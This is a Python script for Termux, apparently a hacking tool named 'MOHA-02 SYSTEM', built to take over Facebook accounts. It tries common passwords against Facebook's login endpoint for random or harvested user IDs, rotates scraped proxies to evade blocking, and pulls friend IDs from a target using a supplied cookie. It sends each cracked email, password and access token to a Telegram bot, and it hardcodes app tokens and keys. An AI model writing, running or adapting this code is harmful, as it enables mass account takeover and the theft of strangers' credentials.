# -*- coding: utf-8 -*-
# --------------------------------------------------------
# Tool Name: MOHA-02 SYSTEM (Ultimate Edition)
# Developer: Moha Al-Shalfawi (@m_oha_02)
# Version: 3.0 (2026)
# --------------------------------------------------------

import os, sys, time, requests, random, uuid, threading, json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

# --- Color Matrix for Termux ---
Z = '\033[1;31m'  # Red
F = '\033[1;32m'  # Green
X = '\033[1;33m'  # Yellow
B = '\033[1;34m'  # Blue
P = '\033[1;35m'  # Pink
C = '\033[1;36m'  # Cyan
W = '\033[1;37m'  # White

# --- Global Variables ---
hits = 0
cp = 0
bad = 0
proxy_list = []

# --- 📢 Auto Join Channel Function ---
def join_channel():
    print(f"{X}[*] Joining Official Channel...")
    time.sleep(2)
    os.system("termux-open-url https://t.me/m_oha0_2b")

def logo():
    os.system('clear')
    print(f"""
{B}   __  __  ____  _   _    _      ___ ____  
{B}  |  \/  |/ __ \| | | |  / \    / _ \___ \ 
{X}  | |\/| | |  | | |_| | / _ \  | | | |__) |
{X}  | |  | | |__| |  _  |/ ___ \ | |_| / __/ 
{F}  |_|  |_|\____/|_| |_/_/   \_\ \___/_____|
{F}       SYSTEM V3.0 - BY MOHA AL-SHALFAWI
{X}--------------------------------------------------
{W}  [+] Developer : @m_oha_02
{W}  [+] Channel   : t.me/m_oha0_2b
{X}--------------------------------------------------""")

# --- 🛠️ Proxy Fetching Engine ---
def fetch_proxies():
    global proxy_list
    print(f"{C}[*] Fetching new proxies to avoid blocking...")
    try:
        res = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
        proxy_list = res.splitlines()
        print(f"{F}[+] Successfully loaded {len(proxy_list)} proxies.")
    except:
        print(f"{Z}[!] Failed to fetch proxies, using local IP.")

# --- 🛠️ Login/Checker Function ---
def login_fb(email, pw, chat_id=None, bot_token=None):
    global hits, cp, bad
    ua = "Dalvik/2.1.0 (Linux; U; Android 11; RMX3263) [FBAN/FB4A;FBAV/450.0.0.45.109;]"
    proxy = {"http": random.choice(proxy_list)} if proxy_list else None
    
    url = "https://b-graph.facebook.com/auth/login"
    data = {
        "email": email, "password": pw,
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "method": "auth.login", "format": "json", "device_id": str(uuid.uuid4())
    }
    
    try:
        res = requests.post(url, data=data, headers={"User-Agent": ua}, proxies=proxy, timeout=10).json()
        if "session_key" in res:
            hits += 1
            print(f"\r{F}[HIT] {email} | {pw}                    ")
            if bot_token and chat_id:
                msg = f"🔥 MOHA HIT!\nEmail: {email}\nPass: {pw}\nToken: {res.get('access_token')}"
                requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={msg}")
        elif "www.facebook.com" in str(res):
            cp += 1
            print(f"\r{X}[CP] {email} | {pw}                     ")
        else:
            bad += 1
            sys.stdout.write(f"\r{W}[Checking] {hits}/{cp}/{bad} | {email[:15]}..."); sys.stdout.flush()
    except: pass

# --- 🚀 Tool 1: Random Old Account Cracking ---
def tool_old_accounts():
    logo()
    token = input(f"{C}[+] Enter Bot Token: ")
    id = input(f"{C}[+] Enter Chat ID: ")
    passwords = ['19901990', '19801980', '123456', '123123', '112233']
    fetch_proxies()
    
    print(f"{F}[*] Attack started on old accounts...")
    with ThreadPoolExecutor(max_workers=30) as pool:
        while True:
            uid = "1000" + str(random.randint(100000000, 999999999))
            for pw in passwords:
                pool.submit(login_fb, uid, pw, id, token)

# --- 🚀 Tool 2: ID Extractor ---
def tool_extract_ids():
    logo()
    cookie = input(f"{C}[+] Enter Account Cookie: ")
    target_id = input(f"{C}[+] Enter Target ID: ")
    print(f"{X}[*] Extracting IDs... Please wait")
    
    try:
        res = requests.get(f"https://graph.facebook.com/{target_id}/friends?access_token={cookie}").json()
        with open("extracted_ids.txt", "a") as f:
            for friend in res['data']:
                f.write(f"{friend['id']}|{friend['name']}\n")
        print(f"{F}[+] IDs saved to extracted_ids.txt")
        time.sleep(2)
    except:
        print(f"{Z}[!] Extraction failed. Check your cookie.")
        time.sleep(2)

# --- 🚀 Tool 3: File Checker ---
def tool_file_checker():
    logo()
    file_path = input(f"{C}[+] Enter ID file path (e.g., id.txt): ")
    token = input(f"{C}[+] Enter Bot Token: ")
    id = input(f"{C}[+] Enter Chat ID: ")
    
    passwords = ['123456', '12345678', '11223344', 'first123']
    fetch_proxies()
    
    try:
        users = open(file_path, "r").read().splitlines()
        print(f"{F}[*] Loaded {len(users)} accounts. Starting check...")
        with ThreadPoolExecutor(max_workers=30) as pool:
            for line in users:
                user = line.split('|')[0]
                for pw in passwords:
                    cpw = pw.replace("first", line.split('|')[1].split(' ')[0]) if '|' in line else pw
                    pool.submit(login_fb, user, cpw, id, token)
    except:
        print(f"{Z}[!] File not found!")
        time.sleep(2)

# --- Main Menu ---
def main():
    join_channel() # استدعاء القناة عند البداية
    while True:
        logo()
        print(f"{B}[1] Crack Old Accounts (Random + Common Pass)")
        print(f"{B}[2] Extract IDs (From Friends List)")
        print(f"{B}[3] File Checker (Targeted Attack)")
        print(f"{Z}[0] Exit Tool")
        
        choice = input(f"\n{X}MOHA-02 > ")
        
        if choice == '1': tool_old_accounts()
        elif choice == '2': tool_extract_ids()
        elif choice == '3': tool_file_checker()
        elif choice == '0': sys.exit()
        else: print(f"{Z}Invalid Choice!"); time.sleep(1)

if __name__ == "__main__":
    main()
